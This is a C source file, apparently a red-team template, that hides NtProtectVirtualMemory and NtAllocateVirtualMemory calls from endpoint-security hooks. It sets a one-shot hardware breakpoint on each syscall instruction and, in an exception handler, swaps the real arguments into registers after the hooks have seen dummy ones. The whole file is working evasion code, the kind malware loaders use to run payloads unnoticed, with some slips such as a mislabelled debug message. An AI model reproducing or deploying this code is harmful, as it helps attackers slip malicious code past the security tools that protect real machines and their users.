/****************************************************************/
/* Technique roughtly inspired from Tampering Syscall by Rads:  */
/* https://github.com/rad9800/TamperingSyscalls                 */
/****************************************************************/

#include "headers.h"

/****************************************************************/
/* This enumeration contains the function that will be called   */
/* through an HWBP.                                             */
/* Add the name of the function following the given parttern    */
/****************************************************************/
enum {
	NTPROTECTVIRTUALMEMORY_ENUM = 0,
	NTALLOCATEVIRTUALMEMORY_ENUM,
};

typedef struct {
	int		index;
	LPVOID	arguments;
} STATE;



/****************************************************************/
/* These Args structures contains the list of the parameters    */
/*  expected by the functions. You can find them in the MSC doc */
/*  Create one structure per function                           */
/****************************************************************/
typedef struct {
	HANDLE hProcess;
	LPVOID lpAddress;
	SIZE_T dwSize;
	DWORD  flNewProtect;
	PDWORD lpflOldProtect;
}NtProtectVirtualMemoryArgs;

typedef struct {
	HANDLE hProcess;
	PVOID* lpAddress;
	ULONG_PTR ZeroBits;
	PULONG dwSize;
	ULONG  flAllocationType;
	ULONG  flProtect;
}NtAllocateVirtualMemoryArgs;


/****************************************************************/
/* Here instanciate you arguments structures                    */
/****************************************************************/
DWORD EnumState;
NtProtectVirtualMemoryArgs pNtProtectVirtualMemoryArgs;
NtAllocateVirtualMemoryArgs pNtAllocateVirtualMemoryArgs;


/****************************************************************/
/* Add the args structure to the enumeration                    */
/****************************************************************/
STATE StateArray[] = {
	{ NTPROTECTVIRTUALMEMORY_ENUM,     &pNtProtectVirtualMemoryArgs  },
	{ NTALLOCATEVIRTUALMEMORY_ENUM,     &pNtAllocateVirtualMemoryArgs  },
};

/****************************************************************/
/* This function configure the hardware breakpoint on a given   */
/* address. When you wan to call a function, call this function */
/* with the address of the SYSCALL you want to bypass           */
/* Look at the pNtProtectVirtualMemory_ function example        */
/****************************************************************/
VOID SetOneshotHardwareBreakpoint(LPVOID address)
{
	CONTEXT context = { 0 };
	context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	GetThreadContext(GetCurrentThread(), &context);

	context.Dr0 = (DWORD64)address;
	context.Dr6 = 0;
	context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 16)) | (0 << 16);
	context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 18)) | (0 << 18);
	context.Dr7 = (context.Dr7 & ~(((1 << 1) - 1) << 0)) | (1 << 0);

	context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	SetThreadContext(GetCurrentThread(), &context);

	return;
}


/****************************************************************/
/* This function extract the syscall address from a given       */
/* function start address                                       */
/****************************************************************/
LPVOID FindSyscallAddress(LPVOID function)
{
	BYTE stub[] = { 0x0F, 0x05 };
	for (unsigned int i = 0; i < (unsigned int)25; i++)
	{
		if (memcmp((LPVOID)((DWORD_PTR)function + i), stub, 2) == 0) {
			return (LPVOID)((DWORD_PTR)function + i);
		}
	}
	return NULL;
}


/****************************************************************/
/* This function will handle the execution flow when the HWBP   */
/* is triggered.                                                */
/* The function will check the event properties to check if it  */
/* is related to an HWBP, and then process the event according  */
/* to the function by modifying the parameters in the stack     */
/****************************************************************/
LONG WINAPI OneShotHardwareBreakpointHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
	DEBUG("\t[-] Hardware breakpoint triggered\n");
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{
		DEBUG("\t[-] Single step breakpoint exception\n");
		if (ExceptionInfo->ContextRecord->Dr7 & 1) {
			// if the ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 
			// then we are at the one shot breakpoint address
			// ExceptionInfo->ContextRecord->Rax should hold the syscall number
			DEBUG("\t[-] Syscall : 0x%x\n", ExceptionInfo->ContextRecord->Rax);
			if (ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0) {
				ExceptionInfo->ContextRecord->Dr0 = 0;

				// You need to fix your arguments in the right registers and stack here.
				switch (EnumState) {
					// RCX moved into R10!!! Kudos to @anthonyprintup for catching this 

                /****************************************************************/
                /* Add you cases here. One per function. The goal is to replace */
                /* the parameters in memory. This example only works for the 4  */
                /* first parameters. Otherwise, you have to play with the stack */
                /* Feel free to try !                                           */
                /****************************************************************/
				case NTPROTECTVIRTUALMEMORY_ENUM:
					DEBUG("\t[-] Patching NtResumeThread arguments\n");
					ExceptionInfo->ContextRecord->R10 =
						(DWORD_PTR)((NtProtectVirtualMemoryArgs*)(StateArray[EnumState].arguments))->hProcess;
					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtProtectVirtualMemoryArgs*)(StateArray[EnumState].arguments))->lpAddress;
					ExceptionInfo->ContextRecord->R8 =
						(DWORD_PTR)((NtProtectVirtualMemoryArgs*)(StateArray[EnumState].arguments))->dwSize;
					ExceptionInfo->ContextRecord->R9 =
						(DWORD_PTR)((NtProtectVirtualMemoryArgs*)(StateArray[EnumState].arguments))->flNewProtect;
					break;

				case NTALLOCATEVIRTUALMEMORY_ENUM:
					ExceptionInfo->ContextRecord->R10 =
						(DWORD_PTR)((NtAllocateVirtualMemoryArgs*)(StateArray[EnumState].arguments))->hProcess;
					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtAllocateVirtualMemoryArgs*)(StateArray[EnumState].arguments))->lpAddress;
					ExceptionInfo->ContextRecord->R8 =
						(DWORD_PTR)((NtAllocateVirtualMemoryArgs*)(StateArray[EnumState].arguments))->ZeroBits;
					ExceptionInfo->ContextRecord->R9 =
						(DWORD_PTR)((NtAllocateVirtualMemoryArgs*)(StateArray[EnumState].arguments))->dwSize;

					break;
					// you have messed up by not providing the indexed state
				default:
					DEBUG("\t[-] Seems we fucked up \n");
					ExceptionInfo->ContextRecord->Rip += 1;	// just so we don't hang
					break;
				}
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}


/****************************************************************/
/* The function that must be called when wanting to use the     */
/* related NtFunction.                                          */
/* For each function you want to dehook, you must create this   */
/* type of wrapper that will :                                  */
/*      1. Instanciate the Args structure                       */
/*      2. Retrieve the syscall address                         */
/*      3. Configure the HWBP                                   */
/*      4. Make a dummy call                                    */
/****************************************************************/
NTSTATUS pNtProtectVirtualMemory_(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect) {
	NTSTATUS status;

	pNtProtectVirtualMemoryArgs.hProcess = hProcess;
	pNtProtectVirtualMemoryArgs.lpAddress = lpAddress;
	pNtProtectVirtualMemoryArgs.dwSize = dwSize;
	pNtProtectVirtualMemoryArgs.flNewProtect = flNewProtect;
	pNtProtectVirtualMemoryArgs.lpflOldProtect = lpflOldProtect;
	

	EnumState = NTPROTECTVIRTUALMEMORY_ENUM;
	DEBUG("\t[-] Setting HWBR for NtProtectVirtualMemory\n");
	SetOneshotHardwareBreakpoint(FindSyscallAddress(NtProtectVirtualMemory));
	status = NtProtectVirtualMemory(NULL, NULL, NULL, NULL, lpflOldProtect);
	return status;
}

int main(void){
    /****************************************************************/
    /* Add this to enable the HWBP handling function                */
    /****************************************************************/
    SetUnhandledExceptionFilter(OneShotHardwareBreakpointHandler);
}